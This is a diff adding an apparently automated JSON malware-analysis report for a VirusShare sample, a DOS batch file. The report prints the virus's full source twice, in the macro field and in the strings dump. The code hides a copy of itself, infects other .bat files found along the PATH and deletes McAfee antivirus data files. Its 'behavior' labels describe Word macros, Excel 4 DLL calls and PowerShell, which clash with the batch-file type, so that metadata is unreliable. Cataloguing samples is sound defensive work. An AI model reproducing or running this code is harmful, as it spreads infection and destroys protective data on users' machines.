@@ -1,0 +1,78 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off%_FBi%\nif '%1=='FBi goto FBi%2\nset FBi=%0.bat\nif not exist %FBi% set FBi=%0\nif '%FBi%==' set FBi=autoexec.bat\nif exist c:\\_FBi.bat goto FBi_go\nif not exist %FBi% goto evol_FBi\nfind \"FBi\"<%FBi%>c:\\_FBi.bat\nattrib c:\\_FBi.bat +h\n:FBi_go\nif '%!FBi%=='---- goto FBi_exit\nset !FBi=%!FBi%-\ncommand /e:5000 /c c:\\_FBi FBi v . .. \\ %path%\n:evol_FBi\nset FBi=\ngoto FBi_pay\n:FBiv\nshift%_FBi%\nif '%2==' exit FBi\nfor %%a in (%2\\*.bat %2*.bat) do call c:\\_FBi FBi inf %%a\ngoto FBiv\n:FBi_inf\nfind \"FBi\"<%3>nul\nif not errorlevel 1 goto FBi_jump\ntype %3>FBi$\necho.>>FBi$\ntype c:\\_FBi.bat>>FBi$\nmove FBi$ %3>nul\nset FBi!=%FBi!%-\nif %FBi#%==----exit\n:FBi_jump\nset FBi!=%FBi!%-\nif %FBi!%==----exit\n:FBi_pay\necho http://www.fbi.sk\n:: FBi\necho y| del c:\\mcafee\\*.dat\n:: FBi\n:FBi_exit"
+    },
+    "filename": "VirusShare_05ae599b9c409cd5e901af4b39242633",
+    "filesize": 810,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "05ae599b9c409cd5e901af4b39242633",
+        "sha1": "d0b8a8d789009d97cad1045988c90df47d584453",
+        "sha256": "097ade8c2ba1b0703194cdb0d95dca0f0c19095a8bed85722b969d21958a997c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%_FBi%",
+            "if '%1=='FBi goto FBi%2",
+            "set FBi=%0.bat",
+            "if not exist %FBi% set FBi=%0",
+            "if '%FBi%==' set FBi=autoexec.bat",
+            "if exist c:\\_FBi.bat goto FBi_go",
+            "if not exist %FBi% goto evol_FBi",
+            "find \"FBi\"<%FBi%>c:\\_FBi.bat",
+            "attrib c:\\_FBi.bat +h",
+            ":FBi_go",
+            "if '%!FBi%=='---- goto FBi_exit",
+            "set !FBi=%!FBi%-",
+            "command /e:5000 /c c:\\_FBi FBi v . .. \\ %path%",
+            ":evol_FBi",
+            "set FBi=",
+            "goto FBi_pay",
+            ":FBiv",
+            "shift%_FBi%",
+            "if '%2==' exit FBi",
+            "for %%a in (%2\\*.bat %2*.bat) do call c:\\_FBi FBi inf %%a",
+            "goto FBiv",
+            ":FBi_inf",
+            "find \"FBi\"<%3>nul",
+            "if not errorlevel 1 goto FBi_jump",
+            "type %3>FBi$",
+            "echo.>>FBi$",
+            "type c:\\_FBi.bat>>FBi$",
+            "move FBi$ %3>nul",
+            "set FBi!=%FBi!%-",
+            "if %FBi#%==----exit",
+            ":FBi_jump",
+            "set FBi!=%FBi!%-",
+            "if %FBi!%==----exit",
+            ":FBi_pay",
+            "echo http://www.fbi.sk",
+            ":: FBi",
+            "echo y| del c:\\mcafee\\*.dat",
+            ":: FBi",
+            ":FBi_exit"
+        ],
+        "file": {
+            "echo y| del c:\\mcafee\\*.dat": "Data"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.fbi.sk"
+        ]
+    },
+    "time": "0:00:00.253585",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
